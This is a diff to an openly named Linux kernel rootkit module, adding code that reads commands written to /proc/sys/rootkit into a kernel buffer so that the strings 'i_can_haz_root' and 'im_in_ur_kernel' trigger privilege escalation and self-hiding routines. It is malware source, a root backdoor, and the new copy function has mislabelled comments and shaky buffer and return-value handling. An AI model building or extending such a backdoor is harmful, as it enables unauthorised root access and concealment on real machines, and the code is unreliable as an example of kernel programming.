@@ -81,6 +81,37 @@ static int sysctl_strcpy_to_user(
     return 0;
 }
 
+// Used when the user reads from the sysctl file.
+// Copies the given src string into the provided
+// userspace buffer.
+static int sysctl_strcpy_to_kernel(
+    char buffer[],
+    size_t buf_len,
+    char __user *src,
+    size_t *lenp,
+    loff_t *ppos)
+{
+    size_t copy_len;
+    loff_t start;
+
+    start = *ppos;
+    copy_len = *lenp;
+
+    if (copy_len > buf_len) {
+        copy_len = buf_len;
+    }
+    
+    if (copy_from_user(buffer, &src[start], copy_len)) {
+        return -EFAULT;
+    }
+    buffer[buf_len - 1] = '\0';
+    buffer[strcspn(buffer, "\r\n")] = '\0';
+
+    return *lenp - copy_len;
+}
+
+static char cmd_buf[128];
+
 // Gets called when a read/write to the /proc/sys/rootkit
 // file occurs.
 //
@@ -93,24 +124,22 @@ static int sysctl_handler(
     size_t *lenp,
     loff_t *ppos)
 {
-    // TODO: Read this from userspace
-    const char *cmd = "i_can_haz_root";
-
     if (!write) {
         return sysctl_strcpy_to_user("not_a_virus.mp3.doc.zip.exe\n", buffer, lenp, ppos);
+    } else {
+        sysctl_strcpy_to_kernel(cmd_buf, 128, buffer, lenp, ppos);
     }
 
-    if (strcmp(cmd, "i_can_haz_root") == 0) {
+    if (strcmp(cmd_buf, "i_can_haz_root") == 0) {
         return sysctl_escalate();
-    } else if (strcmp(cmd, "im_in_ur_kernel") == 0) {
+    } else if (strcmp(cmd_buf, "im_in_ur_kernel") == 0) {
         return sysctl_hide();
     } else {
-        log("Unknown command: %s\n", cmd);
+        log("Unknown command: %s\n", cmd_buf);
         return -EINVAL;
     }
 }
 
-static char cmd_buf[128];
 static struct ctl_table_header *ctl_hdr;
 static struct ctl_table ctl_table[] = {
     {
